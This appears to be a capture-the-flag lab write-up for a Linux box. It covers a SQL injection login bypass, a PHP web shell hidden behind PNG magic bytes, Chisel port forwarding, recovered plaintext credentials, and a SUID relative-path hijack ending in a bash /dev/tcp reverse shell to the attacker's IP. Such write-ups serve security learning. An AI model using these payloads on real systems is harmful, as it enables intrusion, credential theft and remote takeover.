Main steps
1. SQL injection to bypass login page of site
2. Upload PHP reverse shell code by prepending magic bytes to PHP file
3. Gain reverse shell access as `www-data`
4. Enumerate `/var/www/` for database credentials
5. Port forward to attacker machine to access `mysql` database
6. Gain user access from credentials in `mysql` database
7. Enumerate `SUID` binaries for non-default program
8. Run `strings` on binary `sysinfo` to check what commands are called
9. Write script named after one of the commands called and export script directory to PATH
10. Run `sysinfo` and gain root shell

Learning points
1. Can enumerate for SQL injection vulnerabilities by checking for different outputs
2. Port forwarding with `Chisel` if a client for a program is not installed on the victim machine - `mysql` in this case
3. Remember to search up any abnormal `SUID` binaries and check articles properly (even if they aren't on GTFObins)
4. Binaries may call commands from relative paths - this can be exploited through working directories and PATH manipulation

`nmap`
![[Pasted image 20260310003921.png]]

ports 22, 80 open

Navigating to the site shows a link to a login page, and the site tells you to login to upload images.
![[Pasted image 20260310003952.png]]

Trying to login with random credentials gives this error.
![[Pasted image 20260310004939.png]]

Tried carrying out some simple SQL injections with `%'%20or%201=1%20;--` and noticed that the site does not return the same error - possible SQL injection vector.

Tried a few different combinations, with URL encoding and without, (the Username field does not accept spaces) and with `Burpsuite`, and eventually was able to gain access to the upload page by passing `'%20OR%201=1--` to both the username and password parameters.
![[Pasted image 20260310005403.png]]

Led to a file upload page.
![[Pasted image 20260310005630.png]]

Tried to upload a PHP file and got this error message.
![[Pasted image 20260310005654.png]]

Tried double extensions and got a different error message.
![[Pasted image 20260310005723.png]]

Checked the POST request with a legitimate file on `Burpsutie`
![[Pasted image 20260310005843.png]]
![[Pasted image 20260310005855.png]]

Followed by the POST request for my PHP file
![[Pasted image 20260310005957.png]]

I noticed that there was the string PNG at the top of the PNG file - most likely the magic bytes, so I tried to create a simple PHP file with PNG magic bytes and a web shell script using `echo -e "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system(\$_GET['cmd']); ?>" > shell.php.png`.

I was able to upload this file to the site, and accessing it with the argument `?cmd=whoami` returned the user `www-data`.
![[Pasted image 20260310011106.png]]

I then created another file with the PNG magic bytes and a PHP reverse shell script using:
![[Pasted image 20260310011149.png]]

and uploaded it to the server. Accessing it gave me a reverse shell as `www-data`.
![[Pasted image 20260310011221.png]]

Checking the directory `/var/www/Magic` showed a file `db.php5`, which contained credentials for a database.
![[Pasted image 20260310011347.png]]

`theseus`: ` iamkingtheseus `

Checking `ss -ntplu` shows that there is something running on localhost:3306, but trying to run `mysql` is unsuccessful, as the `mysql` client is not installed.

Used `Chisel` to port forward the internal port 3306 to my machine, where I have the client installed. Initially tried using the version of `Chisel` on my Kali but got errors on the server stating that libraries were missing, so I downloaded an older version of `Chisel` from `wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz`.

Steps for setting up port forwarding:
1. Start `Chisel` server on my machine with `./chisel_1.8.1_linux_amd64 server --port 5555 --reverse`
2. Serve `Chisel` binary to server with `wget` and `chmod +x` for execute permissions
3. Run the client on the server with `./chisel_1.8.1_linux_amd64 client 10.10.14.77:5555 R:3306:127.0.0.1:3306 &`
4. Client is now connected to server, message in server log
![[Pasted image 20260310014110.png]]
5. Access `mysql` on the server using `mysql -u theseus -piamkingtheseus -h 127.0.0.1 -P 3306`
![[Pasted image 20260310014146.png]]

Checking the tables in the database shows a plaintext password
![[Pasted image 20260310014225.png]]

`admin` : ` Th3s3usW4sK1ng `

Tried using this password to `su` as user `theseus` and was able to.
![[Pasted image 20260310014319.png]]

Enumerating the `SUID` binaries showed that `sysinfo` had its `SUID` bit set.
Googling this binary gave this article https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e on how to exploit binaries that use relative paths - such as `sysinfo`.

Running `strings /bin/sysinfo` or doing what the article did shows the commands that `sysinfo` calls, including `cat`, `fdisk` etc. By creating a script file named `fdisk` with a reverse shell script in the current working directory and adding that directory to the PATH with `export PATH=$(pwd):$PATH`, it is possible to force the `SUID` program to run my own script.

`strings /bin/sysinfo` output:
![[Pasted image 20260310020413.png]]

Ran `sysinfo` after writing the reverse shell script to `fdisk` using `echo "#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.77/6666 0>&1" >> fdisk` and exporting my PATH, and was able to get a root shell.
![[Pasted image 20260310020219.png]]